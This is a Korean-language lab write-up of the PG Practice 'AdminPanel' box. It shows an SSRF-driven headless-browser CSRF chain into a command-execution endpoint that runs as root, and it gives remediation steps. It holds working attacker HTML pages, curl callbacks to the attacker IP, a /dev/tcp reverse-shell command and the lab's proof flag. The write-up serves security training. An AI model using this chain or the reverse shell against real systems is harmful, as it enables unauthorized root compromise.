---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/ssrf
  - tech/web/csrf
  - tech/web/rce
type: machine
platform: pg
os: linux
ip: 192.168.103.219
ports: [22, 631, 3000]
services: [http, ipp, ssh]
status: solved
manual_tags: true
tech_count: 3
---

> [!info] 요약
> **AdminPanel** · PG Practice · Intermediate · Ubuntu 24.04.1 LTS(커널 `6.8.0-48-generic`) · **플래그 1개**
> 진입점: `3000/tcp` Express 앱의 `/open-url`(SSRF, 검증은 `^https?://` 정규식 하나) → 서버측 헤드리스 크로미움이 공격자 페이지 로드 → 그 페이지의 JS 가 `application/x-www-form-urlencoded` 로 `http://127.0.0.1:3000/exec` 에 blind POST(브라우저 내부에서 발생하는 CSRF) → `/exec` 의 루프백 IP 화이트리스트 통과 → `command` 필드가 `child_process.exec()` 로 무필터 실행
> 권한상승: 해당 없음 — Express 애플리케이션이 root 로 상시 구동돼 RCE 성립과 동시에 root 권한 확보
> `proof.txt` = `1622a3a29581d233c0fd0fe07b8956c2`(root) · `local.txt` 없음 — 단일 플래그 박스, 근거는 `Post-Exploitation`
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.103.219

### Initial Access – `/open-url` SSRF 가 연 서버측 헤드리스 브라우저로 루프백 전용 `/exec` 를 무인증 RCE 로 여는 경로

**Vulnerability Explanation:**
- `/open-url` 의 URL 검증은 `!/^https?:\/\//.test(url)` 하나뿐 — 스킴만 걸러낼 뿐 사설 대역·루프백 목적지 제한 부재
- 검증 통과 URL 을 서버가 직접 요청하지 않고 `puppeteer.launch({ executablePath: '/usr/bin/chromium-browser', args: ['--no-sandbox', '--disable-setuid-sandbox', '--no-zygote', ...] })` 로 헤드리스 크로미움을 기동
- 그 크로미움이 `page.goto(url)` 로 대상을 렌더링 — 자바스크립트까지 실행되는 완전한 브라우저 SSRF
- `/exec` 는 `req.connection.remoteAddress` 가 `127.0.0.1`·`::1`·`::ffff:127.0.0.1` 일 때만 통과하는 루프백 화이트리스트. 위 헤드리스 브라우저는 대상 자신에서 구동되므로 이 조건을 항상 만족
- `body-parser` 는 `json`·`urlencoded` 둘 다 등록, CORS 헤더는 전혀 설정 부재 — `application/x-www-form-urlencoded` POST 는 브라우저 기준 "단순 요청" 이라 프리플라이트 없이 발사되고 서버가 그대로 파싱
- 결과 — SSRF 로 로드된 공격자 페이지의 JS 가 루프백 대상 `/exec` 에 `command` 필드로 blind CSRF POST → IP 게이트·CORS 둘 다 우회 → `child_process.exec(command)` 무필터 실행(재현 세부는 아래 두 번째 `Initial Access` 절)

**Vulnerability Fix:**
- `/open-url` 대상 URL 에 사설 대역(`127.0.0.0/8`·`169.254.0.0/16`·RFC1918)·메타데이터 주소를 걸러내는 SSRF 필터 추가
- `/exec` 자체를 제거하거나, 존재해야 한다면 소스 IP 가 아니라 별도 인증 토큰으로 보호 — 루프백 신뢰는 서버 내부에서 발생하는 SSRF 에 무력
- 임의 URL 을 헤드리스 브라우저로 렌더링하는 기능은 내부망 접근 권한과 분리된 네트워크 네임스페이스로 구동
- 상태 변경·명령 실행 엔드포인트에 CORS 미설정 상태를 방치하지 말 것 — `SameSite` 쿠키나 CSRF 토큰 도입

**Severity:** Critical — 인증 전혀 없이 원격 코드실행, 앱이 root 로 구동돼 즉시 시스템 전체 장악

**Steps to reproduce the attack:**
1. `/open-url` 에 공격자가 통제하는 HTML 페이지 URL 을 POST
2. 서버측 헤드리스 크로미움이 그 페이지 로드
3. 페이지 내 JS 가 로드 즉시 `application/x-www-form-urlencoded` POST 로 `http://127.0.0.1:3000/exec` 에 `command` 필드를 담아 전송
4. 루프백 발신이라 IP 게이트 통과, CORS 프리플라이트 없이 요청 도달 → `child_process.exec()` 실행
5. 페이로드로 리버스셸 트리거 → root 권한 셸 획득

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.103.219 | TCP: 22, 631, 3000 |

```bash
nmap --privileged -sCV -p- -Pn -n -A --min-rate 5000 -oN /home/kali/PG/AdminPanel/nmap-full.txt 192.168.103.219
```

```text
# Nmap 7.98 scan initiated Wed Sep  9 14:37:20 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -n -A --min-rate 5000 -oN /home/kali/PG/AdminPanel/nmap-full.txt 192.168.103.219
Nmap scan report for 192.168.103.219
Host is up (0.10s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f2:5a:a9:66:65:3e:d0:b8:9d:a5:16:8c:e8:16:37:e2 (ECDSA)
|_  256 9b:2d:1d:f8:13:74:ce:96:82:4e:19:35:f9:7e:1b:68 (ED25519)
631/tcp  open  ipp     CUPS 2.4
|_http-title: Forbidden - CUPS v2.4.12
|_http-server-header: CUPS/2.4 IPP/2.1
3000/tcp open  http    Node.js Express framework
|_http-title: AdminPanel
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT      ADDRESS
1   85.02 ms 192.168.45.1
2   84.97 ms 192.168.45.254
3   85.04 ms 192.168.251.1
4   85.15 ms 192.168.103.219

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep  9 14:37:55 2026 -- 1 IP address (1 host up) scanned in 34.26 seconds
```
— 출처: `~/PG/AdminPanel/nmap-full.txt`

nmap 의 OS 추정("MikroTik RouterOS 7.X")은 지문 매칭 오탐 — harvest 로 확인한 실제 OS 는 Ubuntu 24.04.1 LTS. 자동 판정을 근거로 쓰지 말라는 원칙 그대로 적중한 사례.

`631/tcp` CUPS — nmap 배너로 `Forbidden` 확인.
SSRF 확보 후 내부(`127.0.0.1:631/admin/`) 접근을 한 차례 시도해 `ERR_INVALID_AUTH_CREDENTIALS`(기본 인증 요구)까지 도달(`openurl/b_11.json`).
**그 이상의 CUPS 경로·자격증명 시도 부재 — 배제가 아니라 미완.** 침투 경로가 `3000` 쪽에서 먼저 성립해 631 은 되짚지 않은 상태.

`3000/tcp` 웹 루트는 정적 `index.html` 하나("Query website" 입력폼)와 `/open-url` API 뿐. 디렉터리 퍼징 결과:

```text
/index.html           (Status: 200) [Size: 1525]
/static               (Status: 301) [Size: 156] [--> /static/]
/.                    (Status: 301) [Size: 151] [--> /./]
```
— 출처: `~/PG/AdminPanel/gobuster-3000.txt`(`raft-small-words.txt`, 확장자 `php,txt,html,bak,zip,old`)

공통 파일명 프로브(`robots.txt`·`.env`·`.git/HEAD`·`package.json` 등 26종)에서 `/package.json` 만 200 — 의존성 버전 확인:

```json
{
  "dependencies": {
    "body-parser": "^2.2.0",
    "express": "^5.1.0",
    "puppeteer": "^24.9.0"
  }
}
```
— 출처: `~/PG/AdminPanel/web-3000/probe_package.json`(`/package.json` 직접 요청, 200). 프로브 전량 결과는 `web-3000/probe-index.txt` 26행

![[PG-AdminPanel-panel-3000.png]]
*그림 1 — `3000/tcp` 루트의 "Query website" 입력폼. 이 폼 하나가 `/open-url` 을 호출하는 유일한 GUI 진입점이고, 다른 링크·메뉴 부재라 공격면이 이 API 하나로 국한*

헤드리스 크로미움 캡처본(`~/PG/AdminPanel/shot_3000_root.png`). **이 박스의 그림 증적은 이 1장뿐 — 인스턴스 정지로 재촬영 불가.** 셸 획득 이후 단계는 전부 터미널이라 코드펜스로 대체.

### Initial Access – `/open-url` SSRF 로 `/exec` 무인증 RCE

`index.html` 소스에서 `/open-url` 하나만 확인된 상태로 후보 경로 41개를 GET·POST 로 일괄 프로빙.

```text
GET=404 POST=400  /open-url
GET=404 POST=403  /exec
```
— 출처: `~/PG/AdminPanel/routefuzz.txt`(`routes.txt` 41개 후보 전량 프로빙. 나머지 39개는 GET·POST 전부 404 라 표에서 생략 — 원문은 경로 그대로 보존)

`/exec` 만 POST 403 으로 다른 경로와 구분돼 별도 접근 조건이 있는 엔드포인트로 특정. 직접 외부에서 POST 하면 게이트에 막힘:

```json
{"error":"Access denied"}
```
— 출처: Kali `/tmp/e.out`(외부 IP 에서 `POST /exec` 직접 호출한 응답 전문, 25바이트)

`/open-url` 이 서버측에서 URL 을 그대로 fetch 하는지, 셸까지 타는지 구분하기 위해 URL 파라미터에 셸 메타문자를 먼저 주입.

```text
http://example.com; id        -> net::ERR_NAME_NOT_RESOLVED at http://example.com; id
http://example.com|id         -> Protocol error (Page.navigate): Cannot navigate to invalid URL
http://example.com$(id)       -> net::ERR_NAME_NOT_RESOLVED at http://example.com$(id)
http://127.0.0.1:22/          -> net::ERR_UNSAFE_PORT at http://127.0.0.1:22/
```
— 출처: `~/PG/AdminPanel/openurl/payload_5.txt`·`payload_7.txt`·`payload_8.txt`·`payload_15.txt` + 대응 `resp_*.json`

전부 문자열 그대로 브라우저 URL 파싱기로 전달됐다는 응답이라 이 파라미터 자체에는 명령주입 부재 — 헤드리스 브라우저를 통한 SSRF 로 방향 전환.
`http://127.0.0.1:22/` 는 서버가 아니라 크로미움 자체의 "안전하지 않은 포트" 목록에 걸려 접근 불가.
`http://127.0.0.1:3000/`·`http://localhost:631/` 는 정상 로드 확인 — SSRF 사거리가 루프백까지 닿는다는 것을 이 시점에 확정.

```text
http://127.0.0.1:3000/   -> {"message":"Opened URL: http://127.0.0.1:3000/"}
http://localhost:631/    -> {"message":"Opened URL: http://localhost:631/"}
```
— 출처: `~/PG/AdminPanel/openurl/payload_1.txt`·`payload_3.txt` + `resp_1.json`·`resp_3.json`

이어서 후보 18종을 일괄 발사(`try.py` 로 `pl1.txt` 각 줄을 `/open-url` 에 POST). 내역은 공격자 페이지 1 · 비-http 스킴 10 · 대문자 스킴 1 · 루프백 포트 스윕 6.

```python
import json,urllib.request,sys
T="http://192.168.103.219:3000/open-url"
pl=[l.rstrip("\n") for l in open(sys.argv[1]) if l.strip()]
for i,p in enumerate(pl):
    try:
        r=urllib.request.urlopen(urllib.request.Request(T,json.dumps({"url":p}).encode(),{"Content-Type":"application/json"}),timeout=25)
        b=r.read().decode()
    except Exception as e:
        try: b=e.read().decode()
        except Exception: b=repr(e)
    open("openurl/b_%02d.json"%i,"w").write(p+"\n>>> "+b)
    print("%02d | %-42s | %s"%(i,p[:42],b[:170]))
```
— 출처: `~/PG/AdminPanel/try.py`

| 페이로드 | 결과 |
|---|---|
| `http://192.168.45.247/probe.html` | `{"message":"Opened URL: …"}` — 크로미움이 공격자 페이지를 예외 없이 로드. 앞서 리스너 기동 전의 `http://192.168.45.247/ssrfcheck` 는 `ERR_CONNECTION_REFUSED`(`resp_4.json`)라, 이 성공은 Kali 측 80 리스너가 실제로 응답한 결과 |
| `FILE:///etc/passwd`·`file:/etc/passwd`·`fiLe:///etc/passwd`·`about:blank`·`chrome://version`·`data:text/html,...`·`javascript:alert(1)`·`view-source:file:///etc/passwd`·`ftp://…`(비-http 스킴 9종) | 전부 400 `Invalid or missing URL` — `^https?://` 통과 실패 |
| `HTTP://192.168.45.247/upper`(대문자) | 400 — 정규식이 대소문자 구분(`i` 플래그 부재), 대문자 스킴도 우회 불가 |
| `http://127.0.0.1:631/admin/` | `ERR_INVALID_AUTH_CREDENTIALS` — 리스닝, 기본 인증 요구 |
| `http://127.0.0.1:9222/json/version`·`:80/`·`:8080/`·`:5000/`·`:3306/` | 전부 `ERR_CONNECTION_REFUSED` — 리스닝 부재 |
| `file://192.168.45.247/x` | 400 — 비-http 스킴 |

— 출처: `~/PG/AdminPanel/pl1.txt`(페이로드 순서)와 `~/PG/AdminPanel/openurl/b_00.json`~`b_17.json`(인덱스 대응 응답)

로컬 파일 직접열람·비-http 스킴 우회는 전부 막혀 있으나, `http(s)://` 스킴을 유지한 채 목적지를 루프백으로 두는 SSRF 자체에는 제한이 없다는 것이 확정.

다음 단계는 `/exec` 가 받는 필드명과, 크로스오리진 POST 가 실제로 서버에 도달하는 조합을 가리는 작업. 공격자 웹서버(포트 80, `/tmp/apwww/`)에 다섯 가지 기법을 동시에 실행하는 페이지를 올리고 `/open-url` 로 로드시켜 각 기법이 실제 실행됐는지 콜백으로 판별.

```html
<html><body>
<script>
var L="http://192.168.45.247";
var T="http://127.0.0.1:3000/exec";
var keys=["cmd","command","c","exec","run","shell","input","code"];
function jbody(tech){var o={};keys.forEach(function(k){o[k]="curl -s "+L+"/HIT-"+tech+"-"+k;});return JSON.stringify(o);}
function ubody(tech){return keys.map(function(k){return k+"="+encodeURIComponent("curl -s "+L+"/HIT-"+tech+"-"+k);}).join("&");}
// A: fetch no-cors text/plain, JSON body
fetch(T,{method:"POST",mode:"no-cors",headers:{"Content-Type":"text/plain"},body:jbody("A")}).catch(function(e){});
// B: fetch no-cors urlencoded
fetch(T,{method:"POST",mode:"no-cors",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:ubody("B")}).catch(function(e){});
// E: fetch cors json (preflight)
fetch(T,{method:"POST",headers:{"Content-Type":"application/json"},body:jbody("E")}).catch(function(e){});
// C: form enctype text/plain -> JSON
function mkform(enc,tech,jsonmode){
  var f=document.createElement("iframe"); f.name="f"+tech+(jsonmode?"j":"u"); f.style.display="none";
  document.body.appendChild(f);
  var frm=document.createElement("form"); frm.method="POST"; frm.action=T; frm.enctype=enc; frm.target=f.name;
  if(jsonmode){
    var o={}; keys.forEach(function(k){o[k]="curl -s "+L+"/HIT-"+tech+"-"+k;});
    var s=JSON.stringify(o); var i=s.lastIndexOf("\"}");
    var inp=document.createElement("input"); inp.name=s.substring(0,s.length-2); inp.value="\"}";
    frm.appendChild(inp);
  } else {
    keys.forEach(function(k){var i=document.createElement("input"); i.name=k; i.value="curl -s "+L+"/HIT-"+tech+"-"+k; frm.appendChild(i);});
  }
  document.body.appendChild(frm); frm.submit();
}
mkform("text/plain","C",true);
mkform("application/x-www-form-urlencoded","D",false);
fetch(L+"/PAGELOADED");
</script>
</body></html>
```
— 출처: Kali `/tmp/apwww/x.html`(1,815바이트, 14:41:56 KST 생성)

공격자 HTTP 서버(포트 80, tmux `ap-web80`)의 스크롤백에서 확인한 도달 기록:

```text
192.168.103.219 - - [09/Sep/2026 14:42:05] "GET /x.html HTTP/1.1" 200 -
192.168.103.219 - - [09/Sep/2026 14:42:05] "GET /PAGELOADED HTTP/1.1" 404 -
192.168.103.219 - - [09/Sep/2026 14:42:05] "GET /HIT-B-command HTTP/1.1" 404 -
192.168.103.219 - - [09/Sep/2026 14:42:05] "GET /HIT-D-command HTTP/1.1" 404 -
```
— 출처: 리스너 tmux 세션 `ap-web80` 스크롤백. **원문 미보존**

페이지 로드(`/PAGELOADED`) 뒤 되돌아온 `HIT-*` 콜백은 B·D 두 건뿐. 기법 B(`fetch` no-cors, `application/x-www-form-urlencoded`)와 D(hidden iframe form, 같은 인코딩)만 `command` 키로 발화.
A·C(둘 다 `Content-Type` 이 `text/plain`)와 E(`application/json`, CORS 프리플라이트 필요)는 콜백 부재.
결론 — `body-parser.urlencoded` 가 파싱 가능한 `Content-Type` 이면서 프리플라이트 없이 발사되는 조합만 서버에 도달.
8개 키 중 서버가 실제로 읽는 이름은 `command` 하나. 이 시점에는 소스 미확보라 콜백만으로 역추적.
사후 확보한 `/app/app.js` 가 그 역추적을 그대로 뒷받침(`Post-Exploitation` 절 소스) — `bodyParser` 등록이 `json`·`urlencoded` 둘뿐이고, CORS 헤더가 없으며, 파라미터 추출이 `const { command } = req.body`.

이 결론으로 최종 페이로드를 단순화 — 쿼리스트링으로 명령을 받는 한 줄짜리 트리거 페이지.

```html
<html><body>
<script>
var p=new URLSearchParams(location.search);
var c=p.get("c")||"id";
fetch("http://127.0.0.1:3000/exec",{method:"POST",mode:"no-cors",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"command="+encodeURIComponent(c)}).catch(function(e){});
fetch("http://192.168.45.247/SENT");
</script>
</body></html>
```
— 출처: Kali `/tmp/apwww/r.html`(340바이트, 14:42:27 KST 생성)

이 페이지를 `/open-url` 로 로드시키며 `c` 파라미터에 리버스셸 명령을 실어 호출.

```text
192.168.103.219 - - [09/Sep/2026 14:42:45] "GET /r.html?c=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.45.247/443%200%3E%261%22 HTTP/1.1" 200 -
192.168.103.219 - - [09/Sep/2026 14:42:45] "GET /SENT HTTP/1.1" 404 -
```
— 출처: 리스너 tmux 세션 `ap-web80` 스크롤백. **원문 미보존**

`443/tcp` 로 대기 중이던 리스너(tmux `ap-rev443`)에 root 권한 대화형 셸 연결. 그 셸에서 `whoami`·`id`·`hostname`·`hostname -I`·`date`·`cat /root/proof.txt` 를 한 명령으로 묶어 원위치 실행한 결과:

```bash
root
uid=0(root) gid=0(root) groups=0(root)
localhost
192.168.103.219
Wed Sep  9 05:43:43 AM UTC 2026
1622a3a29581d233c0fd0fe07b8956c2
root@localhost:/app#
```
— 출처: `~/PG/AdminPanel/proof_root.txt`(대화형 pty 프롬프트 `root@localhost:/app#` 포함, 타겟 셸에서 실측)

이 한 화면에 플래그 값·타깃 IP(`192.168.103.219`)·`id` 의 `uid=0(root)` 세 요소가 공존.

`/open-url` 을 `r.html` 로 향하게 한 마지막 POST 자체는 **원문 미보존**. 다만 사슬의 양 끝은 각각 파일로 잔존 — 시작점은 `/tmp/apwww/r.html`(14:42:27 KST), 도착점은 `proof_root.txt` 의 타겟 pty 세션(타겟 시각 05:43:43 UTC = 14:43:43 KST).

**Local.txt value:**

없음 — 단일 플래그 박스. `harvest.txt` FLAGS 절의 전 파일시스템 플래그 탐색 결과가 `/root/proof.txt` 한 건뿐:

```text
===== FLAGS =====
--- /root/proof.txt
-rw-r--r-- 1 root root 33 Sep  9 05:33 /root/proof.txt
1622a3a29581d233c0fd0fe07b8956c2
```
— 출처: `~/PG/AdminPanel/harvest.txt` FLAGS 절(1403~1406행, 파일 말미)

### Privilege Escalation – 해당 없음, Express 애플리케이션이 root 로 구동

**Vulnerability Explanation:**
- 권한상승 단계 부재 — `/app/app.js` 를 실행하는 Node.js 프로세스(PID 1052)가 root 소유라, `/exec` 가 `child_process.exec()` 로 낳는 자식 프로세스도 그대로 root
- 초기 접근에서 얻은 첫 명령의 `id` 출력이 이미 `uid=0(root) gid=0(root) groups=0(root)` — 별도 상승 시도 없이 확인

**Vulnerability Fix:**
- 애플리케이션을 전용 저권한 서비스 계정으로 구동(`systemd` 유닛의 `User=`/`Group=` 지정, 또는 `setpriv` 로 권한 드롭)
- 3000 은 비특권 포트라 root 바인딩이 불필요 — 현 구성에 root 를 정당화할 요건 부재

**Severity:** Critical — 웹 애플리케이션의 명령 실행 결함 하나가 곧바로 시스템 전체 장악으로 직결

**Steps to reproduce the attack:**
1. 앞 절의 `/exec` 경유 리버스셸 콜백을 그대로 수신
2. 콜백된 셸에서 `id` 확인 — 추가 조작 없이 `uid=0(root)`

앱 프로세스의 소유자 확인:

```text
root        1052  2.0  2.3 1473088 46388 ?       Ssl  05:30   0:17 /root/.nvm/versions/node/v24.4.1/bin/node /app/app.js
```
— 출처: `~/PG/AdminPanel/harvest.txt` PROCS 절(`ps auxf`, 301행)

`sudo -l`·SUID·`getcap`·크론 열거는 `harvest.txt` 에 전량 수집돼 있으나, root 를 이미 보유한 상태라 악용 대상으로 검토한 항목 부재.

**수동 대안** — 해당 없음(권한상승 단계 자체가 부재).

### Post-Exploitation

셸 획득 직후 `/app/app.js` 소스를 확보해 위 재현으로 추론한 게이트 로직을 사후 확인.

```javascript
const express = require('express');
const bodyParser = require('body-parser');
const puppeteer = require('puppeteer');
const { exec } = require('child_process');
const path = require('path');

const app = express();
const PORT = 3000;

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, './')));

app.post('/open-url', async (req, res) => {
    const { url } = req.body;

    if (!url || !/^https?:\/\//.test(url)) {
        return res.status(400).json({ error: 'Invalid or missing URL' });
    }

    try {
        const browser = await puppeteer.launch({ executablePath: '/usr/bin/chromium-browser', args: [ '--disable-gpu', '--disable-setuid-sandbox', '--no-sandbox', '--no-zygote' ] })
        const page = await browser.newPage();
        await page.goto(url);
        await browser.close();
        res.json({ message: `Opened URL: ${url}` });
    } catch (error) {
        console.error('Puppeteer error:', error);
        res.status(500).json({ error: error.message || 'Failed to open URL' });
    }
});

app.post('/exec', (req, res) => {
    const clientIP = req.connection.remoteAddress;

    if (clientIP !== '::1' && clientIP !== '127.0.0.1' && clientIP !== '::ffff:127.0.0.1') {
        return res.status(403).json({ error: 'Access denied' });
    }

    const { command } = req.body;

    if (!command) {
        return res.status(400).json({ error: 'Missing command' });
    }

    exec(command, (error, stdout, stderr) => {
        if (error) {
            return res.status(500).json({ error: stderr || error.message });
        }

        res.json({ output: stdout });
    });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on http://0.0.0.0:${PORT}`);
});
```
— 출처: `~/PG/AdminPanel/app_source_capture.txt`(`cat /app/*.js`, 대화형 셸에서 실측). 80칸 터미널 폭에 의한 줄바꿈 재조립과 들여쓰기 정규화(탭 1자리)를 거친 판본이고 토큰은 무편집. **원문 그대로(줄바꿈 위치·탭·pty 프롬프트 재출력 포함)는 해당 파일에 보존.**

`hostname`·프롬프트가 `localhost`/`root@localhost:/app#` 라 컨테이너 여부를 별도 확인. PID 1 이 실제 `/sbin/init` 이고 루트가 LVM 백엔드 `ext4`, `snapd` squashfs 마운트·`ens192` 물리 인터페이스가 모두 존재 — 컨테이너가 아니라 완전한 VM.

```text
root           1  0.1  0.4  22536  8892 ?        Ss   05:30   0:01 /sbin/init
```
```text
/dev/mapper/ubuntu--vg-ubuntu--lv on / type ext4 (rw,relatime)
/var/lib/snapd/snaps/chromium_3203.snap on /snap/chromium/3203 type squashfs (ro,nodev,relatime,errors=continue,threads=single,x-gdu.hide,x-gvfs-hide)
```
— 출처: `~/PG/AdminPanel/harvest.txt` PROCS·MOUNTS 절

`hostname`/`/app` 작업 디렉터리는 애플리케이션 배포 관례일 뿐이라 컨테이너 근거가 아님. `/proc/1/cgroup`·`.dockerenv` 는 harvest 수집 항목 밖이나, 위 세 근거(PID 1 이 `/sbin/init`·LVM 루트·물리 NIC `ens192`)가 컨테이너에서는 동시에 성립하지 않으므로 VM 으로 판정.

**Proof.txt value:**
`1622a3a29581d233c0fd0fe07b8956c2`

- 획득 권한 — `root`
- 취득 형태 — **웹셸 경유 아님.** 타겟 pty 세션(`root@localhost:/app#`)에서 `/root/proof.txt` 를 원위치 `cat`. 근거는 `proof_root.txt` 의 프롬프트 행과, 같은 세션 스크롤백을 이어 받은 `app_source_capture.txt` 의 명령 재출력
- 채점 3요건 중 **그림 증적 미확보** — 셸 이후 구간이 전부 터미널이고 인스턴스 정지로 재촬영 불가. 대체 증적은 위 한 화면 텍스트(플래그·`hostname -I`·`id`)
- `local.txt` — 위 `Local.txt value:` 절 참조

셸 안에서 소스 사본과 열거 스크립트를 배치한 뒤 harvest 실행. 타겟 `/tmp/h.sh`(3,055바이트)는 Kali `/tmp/apwww/harvest.sh` 와 같은 크기라 `curl` 로 받아간 사본:

```text
수집 완료: /tmp/.h/harvest.txt
1406 /tmp/.h/harvest.txt
```
— 출처: `~/PG/AdminPanel/harvest.out`(60바이트, 14:45:08 KST). 행수 `1406` 은 회수본 `harvest.txt` 의 `wc -l` 과 일치

harvest 결과는 Kali 로 회수돼 `~/PG/AdminPanel/harvest.txt`(168,561바이트, 14:45:33 KST)로 저장. 회수에 쓴 명령과 수신 리스너(tmux `ap-rx`) 로그는 **원문 미보존**.

**남긴 흔적**

| 종류 | 대상 | 내용 | 복구 여부 |
|---|---|---|---|
| 업로드 파일 | `/tmp/app.js.copy` | 소스 사본 | 잔존 |
| 업로드 파일 | `/tmp/h.sh`·`/tmp/.h/harvest.txt`·`/tmp/harvest.out` | 열거 스크립트와 결과물 | 잔존 |
| 부산물 | `/tmp/puppeteer_dev_chrome_profile-*` 14건(harvest.txt TMP 절 `/tmp` 목록 기준) | `/open-url` 호출이 남긴 헤드리스 크로미움 프로필 디렉터리. 이 세션의 `/open-url` 호출은 최소 33회(`payload_1~15`·`b_00~17`)라 대부분은 `browser.close()` 로 정리되고 잔존분만 남은 상태 | 잔존 |
| 계정 | — | 변경 부재 | 해당 없음 |
| 설정 변경 | — | 변경 부재 | 해당 없음 |

- 공격 호스트(Kali) `/tmp/apwww/`(`probe.html`·`x.html`·`r.html`·`harvest.sh`) — 이 세션의 웹서버 루트, 정리 필요
- 이 세션의 LHOST — `192.168.45.247`(VPN 재접속마다 변동)

## 관련

- 산출물 — `~/PG/AdminPanel/` 전량(nmap·gobuster·라우트 퍼징·`openurl/` 페이로드·응답·소스·harvest·스크린샷). 볼트 반입분은 `파일보관\PG-AdminPanel-panel-3000.png` 1장
- 원문 미보존 항목
  - `/exec` 각 호출의 요청·응답 원문 — `~/PG/AdminPanel/exec/` 는 빈 디렉터리. 외부 IP 직접 호출의 거부 응답(`/tmp/e.out`)과 앱 소스의 게이트 분기만 파일로 존재
  - 최종 SSRF 트리거(`/open-url` → `r.html`) POST 요청 자체 — 저장된 페이로드 파일 목록 밖. 시작점 `/tmp/apwww/r.html` 과 도착점 `proof_root.txt` 로만 확인
  - 공격자 리스너 3종(`ap-web80` HTTP 로그 · `ap-rev443` 리버스셸 세션 · `ap-rx` harvest 수신)의 스크롤백 — 파일 미저장. 본문에 인용한 로그 4행·2행이 그 전량
  - harvest 회수에 쓴 `/dev/tcp` 스트리밍 명령
- **SSRF 로 연 서버측 헤드리스 브라우저가 루프백 IP 화이트리스트를 우회하는 패턴** — [[_PLAYBOOK]] 참조
- **`Content-Type`·CORS 프리플라이트 유무로 blind CSRF 성공 조합을 가리는 차등 테스트 기법** — [[_PLAYBOOK]] 참조
- [[_PLAYBOOK]] — 시행착오·시험 관점·기법 카드의 유일한 소재지
